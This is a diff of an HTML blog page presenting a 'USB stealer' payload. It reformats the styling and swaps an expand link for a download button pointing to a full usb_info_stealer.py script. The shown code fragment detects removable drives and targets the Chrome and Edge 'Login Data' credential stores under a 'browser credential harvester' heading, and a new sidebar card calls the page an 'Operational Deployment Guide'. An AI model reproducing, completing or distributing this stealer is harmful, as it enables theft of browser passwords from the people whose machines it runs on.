@@ -11,7 +11,6 @@
   <link rel="icon" type="image/png" sizes="16x16" href="../../assets/favicons/favicon_io/favicon-16x16.png">
   <link rel="manifest" href="../../assets/favicons/favicon_io/site.webmanifest">
 
-  <!-- strong CSP (also set server‑side) -->
   <meta http-equiv="Content-Security-Policy"
         content="default-src 'self'; img-src 'self' data: https:; style-src 'self' 'unsafe-inline'; script-src 'nonce-xyz123' 'self'; connect-src 'self' https:; frame-ancestors 'none'; base-uri 'self';" />
   <meta name="referrer" content="no-referrer" />
@@ -57,7 +56,6 @@
       border-radius: var(--radius); z-index: 9999; text-decoration: none;
     }
 
-    /* header with navigation */
     header {
       width: 100%;
       background: #0f1419;
@@ -106,7 +104,6 @@
       text-shadow: 0 0 5px var(--accent);
     }
 
-    /* main container: 2 columns */
     .container {
       width: 90%;
       max-width: var(--max-width);
@@ -116,14 +113,12 @@
       margin: 2rem auto 3rem;
     }
 
-    /* left column – main content */
     .main-content {
       display: flex;
       flex-direction: column;
       gap: 2rem;
     }
 
-    /* hero with terminal simulation */
     .hero {
       background: var(--bg-lighter);
       border: 1px solid var(--border);
@@ -165,7 +160,6 @@
       margin-left: 4px;
     }
 
-    /* section cards */
     .section-card {
       background: var(--bg-lighter);
       border: 1px solid var(--border);
@@ -195,7 +189,6 @@
       margin: 1.5rem 0 0.5rem 0;
     }
 
-    /* --- blog post specific styles --- */
     .post-meta {
       display: flex;
       align-items: center;
@@ -292,6 +285,9 @@
     .post-body .code-block .string {
       color: var(--accent);
     }
+    .post-body .code-block .keyword {
+      color: var(--accent);
+    }
 
     .post-body .table-wrap {
       overflow-x: auto;
@@ -363,54 +359,26 @@
       text-decoration: underline;
     }
 
-    /* tool-grid reused for cards */
-    .tool-grid {
-      display: grid;
-      grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
-      gap: 1.5rem;
-      margin-top: 1rem;
-    }
-
-    .tool-card {
-      background: #1e262f;
-      border: 1px solid #2f3a47;
+    .download-btn {
+      display: inline-block;
+      background: transparent;
+      border: 1px solid var(--accent);
+      color: var(--accent);
+      padding: 0.6rem 1.5rem;
       border-radius: var(--radius);
-      padding: 1.2rem;
+      font-family: var(--font-mono);
+      font-size: 0.9rem;
+      text-decoration: none;
       transition: all 0.2s;
+      margin: 0.5rem 0 1rem 0;
     }
 
-    .tool-card:hover {
-      border-color: var(--accent);
-      transform: translateY(-3px);
+    .download-btn:hover {
+      background: var(--accent);
+      color: var(--bg);
       box-shadow: var(--glow);
     }
 
-    .tool-card h3 {
-      font-family: var(--font-mono);
-      font-size: 1.3rem;
-      color: var(--accent);
-      margin-bottom: 0.5rem;
-    }
-
-    .tool-card p {
-      color: var(--text-muted);
-      font-size: 0.9rem;
-    }
-
-    .tool-link {
-      display: inline-block;
-      margin-top: 1rem;
-      color: var(--accent);
-      text-decoration: none;
-      font-family: var(--font-mono);
-      font-size: 0.9rem;
-    }
-
-    .tool-link:hover {
-      text-decoration: underline;
-    }
-
-    /* sidebar */
     .sidebar {
       display: flex;
       flex-direction: column;
@@ -522,7 +490,6 @@
   </header>
 
   <div class="container">
-    <!-- main column -->
     <div class="main-content" id="main-content">
 
       <!-- terminal hero -->
@@ -581,7 +548,7 @@
 
         <hr />
 
-        <!-- ===== SECTION 1 ===== -->
+        <!-- SECTION 1 -->
         <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
           <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
         </div>
@@ -659,7 +626,7 @@
 
         <hr />
 
-        <!-- ===== SECTION 2 ===== -->
+        <!-- SECTION 2 -->
         <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
           <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
         </div>
@@ -688,18 +655,19 @@
 
         <hr />
 
-        <!-- ===== SECTION 3 ===== -->
+        <!-- SECTION 3 — code snippet + download -->
         <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
           <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
         </div>
         <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin-bottom:1.2rem;">
-          <span class="prompt">└─$</span> <span class="command">cat usb_stealer.py</span>
+          <span class="prompt">└─$</span> <span class="command">head -n 40 usb_stealer.py</span>
         </div>
 
         <h2># 3. Payload Source Code</h2>
 
         <p>
           Save as <code>usb_stealer.py</code> in your working directory.
+          The full script is available for download below.
         </p>
 
         <div class="code-block">
@@ -710,39 +678,39 @@
           LOG_FILE = os.path.join(OUTPUT_DIR, <span class="string">"log.txt"</span>)
 
           <span class="comment"># --- USB DETECTION (Native API) ---</span>
-          def detect_usb_insertion():
+          <span class="keyword">def</span> detect_usb_insertion():
               drives = []
-              for d in win32api.GetLogicalDriveStrings().split('\x00'):
-                  if d and d != 'C:\\':
-                      try:
-                          if win32file.GetDriveType(d) == win32con.DRIVE_REMOVABLE:
-                              drives.append(d.strip('\\'))
-                      except:
-                          pass
-              return drives
+              <span class="keyword">for</span> d <span class="keyword">in</span> win32api.GetLogicalDriveStrings().split(<span class="string">'\x00'</span>):
+                  <span class="keyword">if</span> d <span class="keyword">and</span> d != <span class="string">'C:\\'</span>:
+                      <span class="keyword">try</span>:
+                          <span class="keyword">if</span> win32file.GetDriveType(d) == win32con.DRIVE_REMOVABLE:
+                              drives.append(d.strip(<span class="string">'\\'</span>))
+                      <span class="keyword">except</span>:
+                          <span class="keyword">pass</span>
+              <span class="keyword">return</span> drives
 
           <span class="comment"># --- BROWSER CREDENTIAL HARVESTER ---</span>
-          def harvest_browser_data():
-              <span class="comment"># Chromium-based browsers (Chrome, Edge)</span>
+          <span class="keyword">def</span> harvest_browser_data():
+              browser_data = {}
+              user_dir = os.path.expanduser(<span class="string">"~"</span>)
+
               chrome_paths = [
-                  os.path.join(user_dir, "AppData", "Local", "Google", "Chrome", "User Data", "Default", "Login Data"),
-                  os.path.join(user_dir, "AppData", "Local", "Microsoft", "Edge", "User Data", "Default", "Login Data")
+                  os.path.join(user_dir, <span class="string">"AppData"</span>, <span class="string">"Local"</span>, <span class="string">"Google"</span>, <span class="string">"Chrome"</span>, <span class="string">"User Data"</span>, <span class="string">"Default"</span>, <span class="string">"Login Data"</span>),
+                  os.path.join(user_dir, <span class="string">"AppData"</span>, <span class="string">"Local"</span>, <span class="string">"Microsoft"</span>, <span class="string">"Edge"</span>, <span class="string">"User Data"</span>, <span class="string">"Default"</span>, <span class="string">"Login Data"</span>)
               ]
+
               <span class="comment"># ... full implementation in the complete source</span>
 
           <span class="comment"># --- MAIN ---</span>
-          if __name__ == "__main__":
+          <span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:
               harvest()
         </div>
 
-        <p>
-          <a href="#" style="color:var(--accent);">▼ Expand full payload source</a> —
-          the complete 200+ line script is available in the original document.
-        </p>
+        <a href="https://lexolen.github.io/lxn/assets/downloads/79b7b781-8cf0-4309-b2f4-b2916323cc26/download/usb_info_stealer/a591a6d40bf420404a011733cfb7b190d62c65bf0bcda32b57b277d9ad9f146e-usb_info_stealer.py" class="download-btn" download>⬇ Download full usb_stealer.py</a>
 
         <hr />
 
-        <!-- ===== SECTION 4 ===== -->
+        <!-- SECTION 4 -->
         <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
           <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
         </div>
@@ -767,7 +735,7 @@
 
         <hr />
 
-        <!-- ===== SECTION 5 ===== -->
+        <!-- SECTION 5 -->
         <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
           <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
         </div>
@@ -814,7 +782,7 @@
 
         <hr />
 
-        <!-- ===== SECTION 6 ===== -->
+        <!-- SECTION 6 -->
         <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
           <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
         </div>
@@ -832,7 +800,7 @@
 
         <hr />
 
-        <!-- ===== SECTION 7 ===== -->
+        <!-- SECTION 7 -->
         <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
           <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
         </div>
@@ -872,7 +840,7 @@
 
         <hr />
 
-        <!-- ===== SECTION 8 ===== -->
+        <!-- SECTION 8 -->
         <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
           <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
         </div>
@@ -913,7 +881,7 @@
 
         <hr />
 
-        <!-- ===== SECTION 9 ===== -->
+        <!-- SECTION 9 -->
         <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
           <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
         </div>
@@ -960,7 +928,7 @@
 
         <hr />
 
-        <!-- ===== SECTION 10 ===== -->
+        <!-- SECTION 10 -->
         <div class="terminal-line" style="font-family:var(--font-mono); color:var(--text-muted); margin:1.5rem 0 0.5rem 0;">
           <span class="prompt">┌──(lexolen㉿kali)-[~/blog/usb-stealer]</span>
         </div>
@@ -1002,7 +970,7 @@
 
     </div>
 
-    <!-- ===== SIDEBAR (identical to original) ===== -->
+    <!-- ===== SIDEBAR ===== -->
     <aside class="sidebar">
       <div class="sidebar-card">
         <h3>ping us</h3>
@@ -1033,6 +1001,27 @@
           <li>➤ free ctf: 2026-04-01</li>
         </ul>
       </div>
+
+      <div class="sidebar-card">
+        <h3>featured research</h3>
+        <ul style="list-style: none; color: var(--text-muted);">
+          <li style="margin-bottom: 1rem; border-bottom: 1px solid var(--border); padding-bottom: 0.8rem;">
+            <a href="usb_info_stealer.html" style="color: var(--accent); text-decoration: none; font-weight: 500; font-family: var(--font-mono);">
+              USB Info Stealer
+            </a>
+            <div style="font-size: 0.8rem; color: var(--text-muted); margin-top: 0.2rem;">
+              Operational Deployment Guide · June 2026
+            </div>
+            <div style="font-size: 0.7rem; color: var(--text-muted); margin-top: 0.2rem; display: flex; gap: 0.5rem; flex-wrap: wrap;">
+              <span style="background: var(--bg); padding: 0.1rem 0.5rem; border-radius: 12px; border: 1px solid var(--border);">#redteam</span>
+              <span style="background: var(--bg); padding: 0.1rem 0.5rem; border-radius: 12px; border: 1px solid var(--border);">#tooling</span>
+            </div>
+          </li>
+          <li style="color: var(--text-muted); font-size: 0.85rem; opacity: 0.6;">
+            <span>more coming soon</span>
+          </li>
+        </ul>
+      </div>
     </aside>
   </div>
 
@@ -1059,7 +1048,6 @@
     })();
   </script>
 
-  <!-- smooth back-to-top -->
   <script nonce="xyz123">
     (function() {
       const backLink = document.querySelector('.back-top');
